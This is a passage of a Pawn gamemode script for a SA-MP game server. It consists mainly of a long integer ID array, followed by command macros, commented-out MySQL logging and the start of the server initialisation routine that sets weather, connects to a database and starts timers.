	14834, 14835, 14836, 14837, 14838, 14839, 14840, 14841, 14842, 14843,
	14844, 14845, 14846, 14847, 14848, 14849, 14850, 14851, 14852, 14853,
	14854, 14855, 14856, 14858, 14859, 14860, 14861, 14862, 14863, 14864,
	14865, 14866, 14867, 14868, 14869, 14870, 14871, 14872, 14873, 14874,
	14875, 14876, 14877, 14878, 14879, 14880, 14881, 14882, 14883, 14885,
	14886, 14887, 14888, 14889, 14890, 14891, 14892, 14893, 14894, 14895,
	14896, 14897, 14898, 14900, 14901, 14902, 14903, 15025, 15026, 15027,
	15028, 15029, 15030, 15031, 15032, 15033, 15034, 15035, 15036, 15037,
	15038, 15039, 15040, 15041, 15042, 15043, 15044, 15045, 15046, 15047,
	15048, 15049, 15050, 15051, 15052, 15053, 15054, 15055, 15056, 15057,
	15058, 15059, 15060, 15061, 15062, 15063, 15064, 16000, 16001, 16002,
	16003, 16004, 16005, 16006, 16007, 16008, 16009, 16010, 16011, 16012,
	16013, 16014, 16015, 16016, 16017, 16018, 16019, 16020, 16021, 16022,
	16023, 16024, 16025, 16026, 16027, 16028, 16029, 16030, 16031, 16032,
	16033, 16034, 16035, 16036, 16037, 16038, 16039, 16040, 16041, 16042,
	16043, 16044, 16045, 16046, 16047, 16048, 16049, 16050, 16051, 16052,
	16053, 16054, 16055, 16056, 16057, 16058, 16059, 16060, 16061, 16062,
	16063, 16064, 16065, 16066, 16067, 16068, 16069, 16070, 16071, 16072,
	16073, 16074, 16075, 16076, 16077, 16078, 16079, 16080, 16081, 16082,
	16083, 16084, 16085, 16086, 16087, 16088, 16089, 16090, 16091, 16092,
	16093, 16094, 16095, 16096, 16097, 16098, 16099, 16100, 16101, 16102,
	16103, 16104, 16105, 16106, 16107, 16108, 16109, 16110, 16111, 16112,
	16113, 16114, 16115, 16116, 16117, 16118, 16119, 16120, 16121, 16122,
	16123, 16124, 16125, 16126, 16127, 16128, 16129, 16130, 16131, 16132,
	16133, 16134, 16135, 16136, 16137, 16138, 16139, 16140, 16141, 16142,
	16143, 16144, 16145, 16146, 16147, 16148, 16149, 16150, 16151, 16152,
	16153, 16154, 16155, 16156, 16157, 16158, 16159, 16160, 16161, 16162,
	16163, 16164, 16165, 16166, 16167, 16168, 16169, 16170, 16171, 16172,
	16173, 16174, 16175, 16176, 16177, 16178, 16179, 16180, 16181, 16182,
	16183, 16184, 16185, 16186, 16187, 16188, 16189, 16190, 16191, 16192,
	16193, 16194, 16195, 16196, 16197, 16198, 16199, 16200, 16201, 16202,
	16203, 16204, 16205, 16206, 16207, 16208, 16209, 16210, 16211, 16212,
	16213, 16214, 16215, 16216, 16217, 16218, 16219, 16220, 16221, 16222,
	16223, 16224, 16225, 16226, 16227, 16228, 16229, 16230, 16231, 16232,
	16233, 16234, 16235, 16236, 16237, 16238, 16239, 16240, 16241, 16242,
	16243, 16244, 16245, 16246, 16247, 16248, 16249, 16250, 16251, 16252,
	16253, 16254, 16255, 16256, 16257, 16258, 16259, 16260, 16261, 16262,
	16263, 16264, 16265, 16266, 16267, 16268, 16269, 16270, 16271, 16272,
	16273, 16274, 16275, 16276, 16277, 16278, 16279, 16280, 16281, 16282,
	16283, 16284, 16285, 16286, 16287, 16288, 16289, 16290, 16291, 16292,
	16293, 16294, 16295, 16296, 16297, 16298, 16299, 16300, 16301, 16302,
	16303, 16304, 16305, 16306, 16307, 16308, 16309, 16310, 16311, 16312,
	16313, 16314, 16315, 16316, 16317, 16318, 16319, 16320, 16321, 16322,
	16323, 16324, 16325, 16326, 16327, 16328, 16329, 16330, 16331, 16332,
	16333, 16334, 16335, 16336, 16337, 16338, 16339, 16340, 16341, 16342,
	16343, 16344, 16345, 16346, 16347, 16348, 16349, 16350, 16351, 16352,
	16353, 16354, 16355, 16356, 16357, 16358, 16359, 16360, 16361, 16362,
	16363, 16364, 16365, 16366, 16367, 16368, 16369, 16370, 16371, 16372,
	16373, 16374, 16375, 16376, 16377, 16378, 16379, 16380, 16381, 16382,
	16383, 16384, 16385, 16386, 16387, 16388, 16389, 16390, 16391, 16392,
	16393, 16394, 16395, 16396, 16397, 16398, 16399, 16400, 16401, 16402,
	16403, 16404, 16405, 16406, 16407, 16408, 16409, 16410, 16411, 16412,
	16413, 16414, 16415, 16416, 16417, 16418, 16419, 16420, 16421, 16422,
	16423, 16424, 16425, 16426, 16427, 16428, 16429, 16430, 16431, 16432,
	16433, 16434, 16435, 16436, 16437, 16438, 16439, 16440, 16441, 16442,
	16443, 16444, 16445, 16446, 16447, 16448, 16449, 16450, 16451, 16452,
	16453, 16454, 16455, 16456, 16457, 16458, 16459, 16460, 16461, 16462,
	16463, 16464, 16465, 16466, 16467, 16468, 16469, 16470, 16471, 16472,
	16473, 16474, 16475, 16476, 16477, 16478, 16479, 16480, 16481, 16482,
	16483, 16484, 16485, 16486, 16487, 16488, 16489, 16490, 16491, 16492,
	16493, 16494, 16495, 16496, 16497, 16498, 16499, 16500, 16501, 16502,
	16503, 16504, 16505, 16506, 16507, 16508, 16509, 16510, 16511, 16512,
	16513, 16514, 16515, 16516, 16517, 16518, 16519, 16520, 16521, 16522,
	16523, 16524, 16525, 16526, 16527, 16528, 16529, 16530, 16531, 16532,
	16533, 16534, 16535, 16536, 16537, 16538, 16539, 16540, 16541, 16542,
	16543, 16544, 16545, 16546, 16547, 16548, 16549, 16550, 16551, 16552,
	16553, 16554, 16555, 16556, 16557, 16558, 16559, 16560, 16561, 16562,
	16563, 16564, 16565, 16566, 16567, 16568, 16569, 16570, 16571, 16572,
	16573, 16574, 16575, 16576, 16577, 16578, 16579, 16580, 16581, 16582,
	16583, 16584, 16585, 16586, 16587, 16588, 16589, 16590, 16591, 16592,
	16593, 16594, 16595, 16596, 16597, 16598, 16599, 16600, 16601, 16602,
	16603, 16604, 16605, 16606, 16607, 16608, 16609, 16610, 16611, 16612,
	16613, 16614, 16615, 16616, 16617, 16618, 16619, 16620, 16621, 16622,
	16623, 16624, 16625, 16626, 16627, 16628, 16629, 16630, 16631, 16632,
	16633, 16634, 16635, 16636, 16637, 16638, 16639, 16640, 16641, 16642,
	16643, 16644, 16645, 16646, 16647, 16648, 16649, 16650, 16651, 16652,
	16653, 16654, 16655, 16656, 16657, 16658, 16659, 16660, 16661, 16662,
	16663, 16664, 16665, 16666, 16667, 16668, 16669, 16670, 16671, 16672,
	16673, 16674, 16675, 16676, 16677, 16678, 16679, 16680, 16681, 16682,
	16683, 16684, 16685, 16686, 16687, 16688, 16689, 16690, 16691, 16692,
	16693, 16694, 16695, 16696, 16697, 16698, 16699, 16700, 16701, 16702,
	16703, 16704, 16705, 16706, 16707, 16708, 16709, 16710, 16711, 16712,
	16713, 16714, 16715, 16716, 16717, 16718, 16719, 16720, 16721, 16722,
	16723, 16724, 16725, 16726, 16727, 16728, 16729, 16730, 16731, 16732,
	16733, 16734, 16735, 16736, 16737, 16738, 16739, 16740, 16741, 16742,
	16743, 16744, 16745, 16746, 16747, 16748, 16749, 16750, 16751, 16752,
	16753, 16754, 16755, 16756, 16757, 16758, 16759, 16760, 16761, 16762,
	16763, 16764, 16765, 16766, 16767, 16768, 16769, 16770, 16771, 16772,
	16773, 16774, 16775, 16776, 16777, 16778, 16779, 16780, 16781, 16782,
	16783, 16784, 16785, 16786, 16787, 16788, 16789, 16790, 17000, 17001,
	17002, 17003, 17004, 17005, 17006, 17007, 17008, 17009, 17010, 17011,
	17012, 17013, 17014, 17015, 17016, 17017, 17018, 17019, 17020, 17021,
	17022, 17023, 17024, 17025, 17026, 17027, 17028, 17029, 17030, 17031,
	17032, 17033, 17034, 17035, 17036, 17037, 17038, 17039, 17040, 17041,
	17042, 17043, 17044, 17045, 17046, 17047, 17048, 17049, 17050, 17051,
	17052, 17053, 17054, 17055, 17056, 17057, 17058, 17059, 17060, 17061,
	17062, 17063, 17064, 17065, 17066, 17067, 17068, 17069, 17070, 17071,
	17072, 17073, 17074, 17075, 17076, 17077, 17078, 17079, 17080, 17081,
	17082, 17083, 17084, 17085, 17086, 17087, 17088, 17089, 17090, 17091,
	17092, 17093, 17094, 17095, 17096, 17097, 17098, 17099, 17100, 17101,
	17102, 17103, 17104, 17105, 17106, 17107, 17108, 17109, 17110, 17111,
	17112, 17113, 17114, 17115, 17116, 17117, 17118, 17119, 17120, 17121,
	17122, 17123, 17124, 17125, 17126, 17127, 17128, 17129, 17130, 17131,
	17132, 17133, 17134, 17135, 17136, 17137, 17138, 17139, 17140, 17141,
	17142, 17143, 17144, 17145, 17146, 17147, 17148, 17149, 17150, 17151,
	17152, 17153, 17154, 17155, 17156, 17157, 17158, 17159, 17160, 17161,
	17162, 17163, 17164, 17165, 17166, 17167, 17168, 17169, 17170, 17171,
	17172, 17173, 17174, 17175, 17176, 17177, 17178, 17179, 17180, 17181,
	17182, 17183, 17184, 17185, 17186, 17187, 17188, 17189, 17190, 17191,
	17192, 17193, 17194, 17195, 17196, 17197, 17198, 17199, 17200, 17201,
	17202, 17203, 17204, 17205, 17206, 17207, 17208, 17209, 17210, 17211,
	17212, 17213, 17214, 17215, 17216, 17217, 17218, 17219, 17220, 17221,
	17222, 17223, 17224, 17225, 17226, 17227, 17228, 17229, 17230, 17231,
	17232, 17233, 17234, 17235, 17236, 17237, 17238, 17239, 17240, 17241,
	17242, 17243, 17244, 17245, 17246, 17247, 17248, 17249, 17250, 17251,
	17252, 17253, 17254, 17255, 17256, 17257, 17258, 17259, 17260, 17261,
	17262, 17263, 17264, 17265, 17266, 17267, 17268, 17269, 17270, 17271,
	17272, 17273, 17274, 17275, 17276, 17277, 17278, 17279, 17280, 17281,
	17282, 17283, 17284, 17285, 17286, 17287, 17288, 17289, 17290, 17291,
	17292, 17293, 17294, 17295, 17296, 17297, 17298, 17299, 17300, 17301,
	17302, 17303, 17304, 17305, 17306, 17307, 17308, 17309, 17310, 17311,
	17312, 17313, 17314, 17315, 17316, 17317, 17318, 17319, 17320, 17321,
	17322, 17323, 17324, 17325, 17326, 17327, 17328, 17329, 17330, 17331,
	17332, 17333, 17334, 17335, 17336, 17337, 17338, 17339, 17340, 17341,
	17342, 17343, 17344, 17345, 17346, 17347, 17348, 17349, 17350, 17351,
	17352, 17353, 17354, 17355, 17356, 17357, 17358, 17359, 17360, 17361,
	17362, 17363, 17364, 17365, 17366, 17367, 17368, 17369, 17370, 17371,
	17372, 17373, 17374, 17375, 17376, 17377, 17378, 17379, 17380, 17381,
	17382, 17383, 17384, 17385, 17386, 17387, 17388, 17389, 17390, 17391,
	17392, 17393, 17394, 17395, 17396, 17397, 17398, 17399, 17400, 17401,
	17402, 17403, 17404, 17405, 17406, 17407, 17408, 17409, 17410, 17411,
	17412, 17413, 17414, 17415, 17416, 17417, 17418, 17419, 17420, 17421,
	17422, 17423, 17424, 17425, 17426, 17427, 17428, 17429, 17430, 17431,
	17432, 17433, 17434, 17435, 17436, 17437, 17438, 17439, 17440, 17441,
	17442, 17443, 17444, 17445, 17446, 17447, 17448, 17449, 17450, 17451,
	17452, 17453, 17454, 17455, 17456, 17457, 17458, 17459, 17460, 17461,
	17462, 17463, 17464, 17465, 17466, 17467, 17468, 17469, 17470, 17471,
	17472, 17473, 17474, 17500, 17501, 17502, 17503, 17504, 17505, 17506,
	17507, 17508, 17509, 17510, 17511, 17512, 17513, 17514, 17515, 17516,
	17517, 17518, 17519, 17520, 17521, 17522, 17523, 17524, 17525, 17526,
	17527, 17528, 17529, 17530, 17531, 17532, 17533, 17534, 17535, 17536,
	17537, 17538, 17539, 17540, 17541, 17542, 17543, 17544, 17545, 17546,
	17547, 17548, 17549, 17550, 17551, 17552, 17553, 17554, 17555, 17556,
	17557, 17558, 17559, 17560, 17561, 17562, 17563, 17564, 17565, 17566,
	17567, 17568, 17569, 17570, 17571, 17572, 17573, 17574, 17575, 17576,
	17577, 17578, 17579, 17580, 17581, 17582, 17583, 17584, 17585, 17586,
	17587, 17588, 17589, 17590, 17591, 17592, 17593, 17594, 17595, 17596,
	17597, 17598, 17599, 17600, 17601, 17602, 17603, 17604, 17605, 17606,
	17607, 17608, 17609, 17610, 17611, 17612, 17613, 17614, 17615, 17616,
	17617, 17618, 17619, 17620, 17621, 17622, 17623, 17624, 17625, 17626,
	17627, 17628, 17629, 17630, 17631, 17632, 17633, 17634, 17635, 17636,
	17637, 17638, 17639, 17640, 17641, 17642, 17643, 17644, 17645, 17646,
	17647, 17648, 17649, 17650, 17651, 17652, 17653, 17654, 17655, 17656,
	17657, 17658, 17659, 17660, 17661, 17662, 17663, 17664, 17665, 17666,
	17667, 17668, 17669, 17670, 17671, 17672, 17673, 17674, 17675, 17676,
	17677, 17678, 17679, 17680, 17681, 17682, 17683, 17684, 17685, 17686,
	17687, 17688, 17689, 17690, 17691, 17692, 17693, 17694, 17695, 17696,
	17697, 17698, 17699, 17700, 17701, 17702, 17703, 17704, 17705, 17706,
	17707, 17708, 17709, 17710, 17711, 17712, 17713, 17714, 17715, 17716,
	17717, 17718, 17719, 17720, 17721, 17722, 17723, 17724, 17725, 17726,
	17727, 17728, 17729, 17730, 17731, 17732, 17733, 17734, 17735, 17736,
	17737, 17738, 17739, 17740, 17741, 17742, 17743, 17744, 17745, 17746,
	17747, 17748, 17749, 17750, 17751, 17752, 17753, 17754, 17755, 17756,
	17757, 17758, 17759, 17760, 17761, 17762, 17763, 17764, 17765, 17766,
	17767, 17768, 17769, 17770, 17771, 17772, 17773, 17774, 17775, 17776,
	17777, 17778, 17779, 17780, 17781, 17782, 17783, 17784, 17785, 17786,
	17787, 17788, 17789, 17790, 17791, 17792, 17793, 17794, 17795, 17796,
	17797, 17798, 17799, 17800, 17801, 17802, 17803, 17804, 17805, 17806,
	17807, 17808, 17809, 17810, 17811, 17812, 17813, 17814, 17815, 17816,
	17817, 17818, 17819, 17820, 17821, 17822, 17823, 17824, 17825, 17826,
	17827, 17828, 17829, 17830, 17831, 17832, 17833, 17834, 17835, 17836,
	17837, 17838, 17839, 17840, 17841, 17842, 17843, 17844, 17845, 17846,
	17847, 17848, 17849, 17850, 17851, 17852, 17853, 17854, 17855, 17856,
	17857, 17858, 17859, 17860, 17861, 17862, 17863, 17864, 17865, 17866,
	17867, 17868, 17869, 17870, 17871, 17872, 17873, 17874, 17875, 17876,
	17877, 17878, 17879, 17880, 17881, 17882, 17883, 17884, 17885, 17886,
	17887, 17888, 17889, 17890, 17891, 17892, 17893, 17894, 17895, 17896,
	17897, 17898, 17899, 17900, 17901, 17902, 17903, 17904, 17905, 17906,
	17907, 17908, 17909, 17910, 17911, 17912, 17913, 17914, 17915, 17916,
	17917, 17918, 17919, 17920, 17921, 17922, 17923, 17924, 17925, 17926,
	17927, 17928, 17929, 17930, 17931, 17932, 17933, 17934, 17935, 17936,
	17937, 17938, 17939, 17940, 17941, 17942, 17943, 17944, 17945, 17946,
	17947, 17948, 17949, 17950, 17951, 17952, 17953, 17954, 17955, 17956,
	17957, 17958, 17959, 17960, 17961, 17962, 17963, 17964, 17965, 17966,
	17967, 17968, 17969, 17970, 17971, 17972, 17973, 17974, 17976, 17978,
	18000, 18001, 18002, 18003, 18004, 18005, 18006, 18007, 18008, 18009,
	18010, 18011, 18012, 18013, 18014, 18015, 18016, 18017, 18018, 18019,
	18020, 18021, 18022, 18023, 18024, 18025, 18026, 18027, 18028, 18029,
	18030, 18031, 18032, 18033, 18034, 18035, 18036, 18038, 18039, 18040,
	18041, 18042, 18043, 18044, 18045, 18046, 18047, 18048, 18049, 18050,
	18051, 18052, 18053, 18054, 18055, 18056, 18057, 18058, 18059, 18060,
	18061, 18062, 18063, 18064, 18065, 18066, 18067, 18068, 18069, 18070,
	18071, 18072, 18073, 18074, 18075, 18076, 18077, 18078, 18079, 18080,
	18081, 18082, 18083, 18084, 18085, 18086, 18087, 18088, 18089, 18090,
	18091, 18092, 18093, 18094, 18095, 18096, 18097, 18098, 18099, 18100,
	18101, 18102, 18104, 18105, 18109, 18112, 18200, 18201, 18202, 18203,
	18204, 18205, 18206, 18207, 18208, 18209, 18210, 18211, 18212, 18213,
	18214, 18215, 18216, 18217, 18218, 18219, 18220, 18221, 18222, 18223,
	18224, 18225, 18226, 18227, 18228, 18229, 18230, 18231, 18232, 18233,
	18234, 18235, 18236, 18237, 18238, 18239, 18240, 18241, 18242, 18243,
	18244, 18245, 18246, 18247, 18248, 18249, 18250, 18251, 18252, 18253,
	18254, 18255, 18256, 18257, 18258, 18259, 18260, 18261, 18262, 18263,
	18264, 18265, 18266, 18267, 18268, 18269, 18270, 18271, 18272, 18273,
	18274, 18275, 18276, 18277, 18278, 18279, 18280, 18281, 18282, 18283,
	18284, 18285, 18286, 18287, 18288, 18289, 18290, 18291, 18292, 18293,
	18294, 18295, 18296, 18297, 18298, 18299, 18300, 18301, 18302, 18303,
	18304, 18305, 18306, 18307, 18308, 18309, 18310, 18311, 18312, 18313,
	18314, 18315, 18316, 18317, 18318, 18319, 18320, 18321, 18322, 18323,
	18324, 18325, 18326, 18327, 18328, 18329, 18330, 18331, 18332, 18333,
	18334, 18335, 18336, 18337, 18338, 18339, 18340, 18341, 18342, 18343,
	18344, 18345, 18346, 18347, 18348, 18349, 18350, 18351, 18352, 18353,
	18354, 18355, 18356, 18357, 18358, 18359, 18360, 18361, 18362, 18363,
	18364, 18365, 18366, 18367, 18368, 18369, 18370, 18371, 18372, 18373,
	18374, 18375, 18376, 18377, 18378, 18379, 18380, 18381, 18382, 18383,
	18384, 18385, 18386, 18387, 18388, 18389, 18390, 18391, 18392, 18393,
	18394, 18395, 18396, 18397, 18398, 18399, 18400, 18401, 18402, 18403,
	18404, 18405, 18406, 18407, 18408, 18409, 18410, 18411, 18412, 18413,
	18414, 18415, 18416, 18417, 18418, 18419, 18420, 18421, 18422, 18423,
	18424, 18425, 18426, 18427, 18428, 18429, 18430, 18431, 18432, 18433,
	18434, 18435, 18436, 18437, 18438, 18439, 18440, 18441, 18442, 18443,
	18444, 18445, 18446, 18447, 18448, 18449, 18450, 18451, 18452, 18453,
	18454, 18455, 18456, 18457, 18458, 18459, 18460, 18461, 18462, 18463,
	18464, 18465, 18466, 18467, 18468, 18469, 18470, 18471, 18472, 18473,
	18474, 18475, 18476, 18477, 18478, 18479, 18480, 18481, 18482, 18483,
	18484, 18485, 18486, 18487, 18488, 18489, 18490, 18491, 18492, 18493,
	18494, 18495, 18496, 18497, 18498, 18499, 18500, 18501, 18502, 18503,
	18504, 18505, 18506, 18507, 18508, 18509, 18510, 18511, 18512, 18513,
	18514, 18515, 18516, 18517, 18518, 18519, 18520, 18521, 18522, 18523,
	18524, 18525, 18526, 18527, 18528, 18529, 18530, 18531, 18532, 18533,
	18534, 18535, 18536, 18537, 18538, 18539, 18540, 18541, 18542, 18543,
	18544, 18545, 18546, 18547, 18548, 18549, 18550, 18551, 18552, 18553,
	18554, 18555, 18556, 18557, 18558, 18559, 18560, 18561, 18562, 18563,
	18564, 18565, 18566, 18567, 18568, 18569, 18570, 18571, 18572, 18573,
	18574, 18575, 18576, 18577, 18578, 18579, 18580, 18581, 18582, 18583,
	18584, 18585, 18586, 18587, 18588, 18589, 18590, 18591, 18592, 18593,
	18594, 18595, 18596, 18597, 18598, 18599, 18600, 18601, 18602, 18603,
	18604, 18605, 18606, 18607, 18608, 18609, 18610, 18611, 18612, 18613,
	18614, 18615, 18616, 18617, 18618, 18619, 18620, 18621, 18622, 18623,
	18624, 18625, 18626, 18627, 18628, 18629, 18630, 18631, 18632, 18633,
	18634, 18635, 18636, 18637, 18638, 18639, 18640, 18641, 18642, 18643,
	18644, 18645, 18646, 18647, 18648, 18649, 18650, 18651, 18652, 18653,
	18654, 18655, 18656, 18657, 18658, 18659, 18660, 18661, 18662, 18663,
	18664, 18665, 18666, 18667, 18668, 18669, 18670, 18671, 18672, 18673,
	18674, 18675, 18676, 18677, 18678, 18679, 18680, 18681, 18682, 18683,
	18684, 18685, 18686, 18687, 18688, 18689, 18690, 18691, 18692, 18693,
	18694, 18695, 18696, 18697, 18698, 18699, 18700, 18701, 18702, 18703,
	18704, 18705, 18706, 18707, 18708, 18709, 18710, 18711, 18712, 18713,
	18714, 18715, 18716, 18717, 18718, 18719, 18720, 18721, 18722, 18723,
	18724, 18725, 18726, 18727, 18728, 18729, 18730, 18731, 18732, 18733,
	18734, 18735, 18736, 18737, 18738, 18739, 18740, 18741, 18742, 18743,
	18744, 18745, 18746, 18747, 18748, 18749, 18750, 18751, 18752, 18753,
	18754, 18755, 18756, 18757, 18758, 18759, 18760, 18761, 18762, 18763,
	18764, 18765, 18766, 18767, 18768, 18769, 18770, 18771, 18772, 18773,
	18774, 18775, 18776, 18777, 18778, 18779, 18780, 18781, 18782, 18783,
	18784, 18785, 18786, 18787, 18788, 18789, 18790, 18791, 18792, 18793,
	18794, 18795, 18796, 18797, 18798, 18799, 18800, 18801, 18802, 18803,
	18804, 18805, 18806, 18807, 18808, 18809, 18810, 18811, 18812, 18813,
	18814, 18815, 18816, 18817, 18818, 18819, 18820, 18821, 18822, 18823,
	18824, 18825, 18826, 18827, 18828, 18829, 18830, 18831, 18832, 18833,
	18834, 18835, 18836, 18837, 18838, 18839, 18840, 18841, 18842, 18843,
	18844, 18845, 18846, 18847, 18848, 18849, 18850, 18851, 18852, 18853,
	18854, 18855, 18856, 18857, 18858, 18859, 18860, 18861, 18862, 18863,
	18864, 18865, 18866, 18867, 18868, 18869, 18870, 18871, 18872, 18873,
	18874, 18875, 18876, 18877, 18878, 18879, 18880, 18881, 18882, 18883,
	18884, 18885, 18886, 18887, 18888, 18889, 18890, 18891, 18892, 18893,
	18894, 18895, 18896, 18897, 18898, 18899, 18900, 18901, 18902, 18903,
	18904, 18905, 18906, 18907, 18908, 18909, 18910, 18911, 18912, 18913,
	18914, 18915, 18916, 18917, 18918, 18919, 18920, 18921, 18922, 18923,
	18924, 18925, 18926, 18927, 18928, 18929, 18930, 18931, 18932, 18933,
	18934, 18935, 18936, 18937, 18938, 18939, 18940, 18941, 18942, 18943,
	18944, 18945, 18946, 18947, 18948, 18949, 18950, 18951, 18952, 18953,
	18954, 18955, 18956, 18957, 18958, 18959, 18960, 18961, 18962, 18963,
	18964, 18965, 18966, 18967, 18968, 18969, 18970, 18971, 18972, 18973,
	18974, 18975, 18976, 18977, 18978, 18979, 18980, 18981, 18982, 18983,
	18984, 18985, 18986, 18987, 18988, 18989, 18990, 18991, 18992, 18993,
	18994, 18995, 18996, 18997, 18998, 18999, 19000, 19001, 19002, 19003,
	19004, 19005, 19006, 19007, 19008, 19009, 19010, 19011, 19012, 19013,
	19014, 19015, 19016, 19017, 19018, 19019, 19020, 19021, 19022, 19023,
	19024, 19025, 19026, 19027, 19028, 19029, 19030, 19031, 19032, 19033,
	19034, 19035, 19036, 19037, 19038, 19039, 19040, 19041, 19042, 19043,
	19044, 19045, 19046, 19047, 19048, 19049, 19050, 19051, 19052, 19053,
	19054, 19055, 19056, 19057, 19058, 19059, 19060, 19061, 19062, 19063,
	19064, 19065, 19066, 19067, 19068, 19069, 19070, 19071, 19072, 19073,
	19074, 19075, 19076, 19077, 19078, 19079, 19080, 19081, 19082, 19083,
	19084, 19085, 19086, 19087, 19088, 19089, 19090, 19091, 19092, 19093,
	19094, 19095, 19096, 19097, 19098, 19099, 19100, 19101, 19102, 19103,
	19104, 19105, 19106, 19107, 19108, 19109, 19110, 19111, 19112, 19113,
	19114, 19115, 19116, 19117, 19118, 19119, 19120, 19121, 19122, 19123,
	19124, 19125, 19126, 19127, 19128, 19129, 19130, 19131, 19132, 19133,
	19134, 19135, 19136, 19137, 19138, 19139, 19140, 19141, 19142, 19143,
	19144, 19145, 19146, 19147, 19148, 19149, 19150, 19151, 19152, 19153,
	19154, 19155, 19156, 19157, 19158, 19159, 19160, 19161, 19162, 19163,
	19164, 19165, 19166, 19167, 19168, 19169, 19170, 19171, 19172, 19173,
	19174, 19175, 19176, 19177, 19178, 19179, 19180, 19181, 19182, 19183,
	19184, 19185, 19186, 19187, 19188, 19189, 19190, 19191, 19192, 19193,
	19194, 19195, 19196, 19197, 19198, 19199, 19200, 19201, 19202, 19203,
	19204, 19205, 19206, 19207, 19208, 19209, 19210, 19211, 19212, 19213,
	19214, 19215, 19216, 19217, 19218, 19219, 19220, 19221, 19222, 19223,
	19224, 19225, 19226, 19227, 19228, 19229, 19230, 19231, 19232, 19233,
	19234, 19235, 19236, 19237, 19238, 19239, 19240, 19241, 19242, 19243,
	19244, 19245, 19246, 19247, 19248, 19249, 19250, 19251, 19252, 19253,
	19254, 19255, 19256, 19257, 19258, 19259, 19260, 19261, 19262, 19263,
	19264, 19265, 19266, 19267, 19268, 19269, 19270, 19271, 19272, 19273,
	19274, 19275, 19276, 19277, 19278, 19279, 19280, 19281, 19282, 19283,
	19284, 19285, 19286, 19287, 19288, 19289, 19290, 19291, 19292, 19293,
	19294, 19295, 19296, 19297, 19298, 19299, 19300, 19301, 19302, 19303,
	19304, 19305, 19306, 19307, 19301, 19302, 19303, 19304, 19308, 19309,
	19310, 19311, 19312, 19313, 19314, 19315, 19316, 19317, 19318, 19319,
	19320, 19321, 19322, 19323, 19325, 19326, 19327, 19328, 19329, 19330,
	19331, 19332, 19333, 19334, 19335, 19336, 19337, 19338, 19339, 19340,
	19341, 19342, 19343, 19344, 19345, 19346, 19347, 19348, 19349, 19350,
	19351, 19352, 19353, 19354, 19355, 19356, 19357, 19358, 19359, 19360,
	19361, 19362, 19363, 19364, 19365, 19366, 19367, 19368, 19369, 19370,
	19371, 19372, 19373, 19374, 19375, 19376, 19377, 19378, 19379, 19380,
	19381, 19382, 19383, 19384, 19385, 19386, 19387, 19388, 19389, 19390,
	19391, 19392, 19393, 19394, 19395, 19396, 19397, 19398, 19399, 19400,
	19401, 19402, 19403, 19404, 19405, 19406, 19407, 19408, 19409, 19410,
	19411, 19412, 19413, 19414, 19415, 19416, 19417, 19418, 19419, 19420,
	19421, 19422, 19423, 19424, 19425, 19426, 19427, 19428, 19429, 19430,
	19431, 19432, 19433, 19434, 19435, 19436, 19437, 19438, 19439, 19440,
	19441, 19442, 19443, 19444, 19445, 19446, 19447, 19448, 19449, 19450,
	19451, 19452, 19453, 19454, 19455, 19456, 19457, 19458, 19459, 19460,
	19461, 19462, 19463, 19464, 19465, 19466, 19467, 19468, 19469, 19470,
	19471, 19472, 19473, 19474, 19475, 19476, 19477, 19478, 19479, 19480,
	19481, 19482, 19483, 19484, 19485, 19486, 19487, 19488, 19489, 19490,
	19491, 19492, 19493, 19494, 19495, 19496, 19497, 19498, 19499, 19500,
	19501, 19502, 19503, 19504, 19505, 19506, 19507, 19508, 19509, 19510,
	19511, 19512, 19513, 19514, 19515
};

#define dcmd(%1,%2,%3) if ((strcmp((%3)[1], #%1, true, (%2)) == 0) && ((((%3)[(%2) + 1] == 0) && (dcmd_%1(playerid, "")))||(((%3)[(%2) + 1] == 32) && (dcmd_%1(playerid, (%3)[(%2) + 2]))))) return 1
#define printflog(%1,%2) printf("[%s] %s", %1, %2)
/*forward printflog(type[], data[]); // MYSQL PLUGIN R7 AND R7-2 HAVE A MEMORY LEAK!
public printflog(type[], data[])
{
	new mysqlStr2[254];
	mysql_real_escape_string(type, type);
	mysql_real_escape_string(data, data);
	format(mysqlStr2, sizeof(mysqlStr2), "INSERT INTO "MYSQL_TABLE_SERVER_LOGS" (server_logs_type, server_logs_data) VALUES('%s', '%s')", type, data);
	mysql_run_query(mysqlConnection, mysqlStr2, false, "", "");
	//printf("[%s] %s", type, data);
}*/
#define ResetSelectMode(%1) CallRemoteFunction("ResetSelectMode", "i", %1)
//AngleToPoint(Float: x1, Float: y1, Float: x2, Float: y2)
//#define AngleToPoint(%0,%1,%2,%3) ( atan( (%3 - %1) / (%2 - %0) ) + ( (%2 < %0) ? (90) : (270) ) )

main()
{
	printf(	 "  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿\n  \
				³ %s ³\n  \
				ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ\n", MODE_NAME);
	//AddServerRule("spacemud", "MrPepino");
}

public OnGameModeInit()
{
	//printf("%s loaded", MODE_NAME);
	printflog("INITIALIZE", "Gamemode loaded.");
    SetGameModeText(MODE_NAME);
	Streamer_VisibleItems(STREAMER_TYPE_OBJECT, 985);
   	djson_GameModeInit();
   	djStyled(true);

	SetWorldTime(13); // normal
	SetWeather(13);
	stime = 12;
	sweather = 0;

	/*SetWorldTime(18); // halloween
	SetWeather(-7);
	stime = 18;
	sweather = -7;*/

	/*SetWorldTime(0); // christmas
	SetWeather(2);
	stime = 0;
	sweather = 2;*/

	UsePlayerPedAnims();
	AllowInteriorWeapons(1);
	EnableStuntBonusForAll(1);
	stringo = "loading";

  	printflog("INITIALIZE", "Starting xMovie logging.");
  	mysql_debug(0);
	mysqlConnection = mysql_connect(MYSQL_IP, MYSQL_USER, MYSQL_DB, MYSQL_PASSWORD);
	if (mysql_ping(mysqlConnection) == -1)
	{
        mysql_reconnect(mysqlConnection);
        if (mysql_ping(mysqlConnection) == -1)
    	{
	    	mysql_close(mysqlConnection);
	        mysqloffline = true;
     		printflog("MYSQL", "Could not connect to MySQL database! Starting offline. (Code #1)");
    	} else printflog("MYSQL", "Successful reconnect to MySQL database.");
    } else printflog("MYSQL", "Successful connection to MySQL database.");

	SetTimer("Routine1",999,1); // 1sec
	SetTimer("Routine2",1000,1); // 1sec
	SetTimer("Routine3",1001,1); // 1sec
	SetTimer("Advert",1140000,1); // 19 minutes
	SetTimer("AllClearWarning1",10200000,1); // 2 hours 50 minutes
	SetTimer("CarUnlockTimer",3600000,1);

	AddPlayerClass(0,1,1,1,1,0,0,0,0,0,0); //CJ

//----------------------DM vehicles---------------------------
